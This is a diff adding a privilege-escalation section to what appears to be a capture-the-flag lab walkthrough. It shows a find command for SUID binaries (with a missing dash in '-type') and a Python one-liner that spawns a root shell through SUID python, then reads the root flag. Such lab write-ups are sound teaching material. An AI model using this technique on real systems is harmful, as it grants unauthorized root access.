@@ -96,5 +96,29 @@ Command : `cat /var/www/user.txt`
 
 ## Task 4 Privilege escalation 
 
+as he ask we need to search for files with [SUID](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit) permission to Esclate our privilege we will use `find` again 
+
+Command : `find  / type f -user root -perm -u=s 2>/dev/null` 
+
+we found python with SUID permissions so the first answer is : `/usr/bin/python`
+
+![image](https://user-images.githubusercontent.com/31727214/212406201-dfedd763-6aa7-49d6-8553-0216051f69be.png)
+
+we can execute python script directly to Escalate privilege to root user
+
+Python Script : `python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’`
+
+let's use `whoami` to test if we obtain root user 
+
+then we will use `find / -type f -name root.txt` to find `root.txt` file 
+
+Finally we will use `cat` to get our Flag `cat /root/root.txt`
+
+![image](https://user-images.githubusercontent.com/31727214/212409198-55f2c438-f8d6-407a-9151-bf15f6b8b777.png)
+
+Will all this steps we finish this room succefully 
+
+![image](https://user-images.githubusercontent.com/31727214/212409814-ca4ba798-7d80-4ce7-8c1a-a514f73d7825.png)
+
 
 
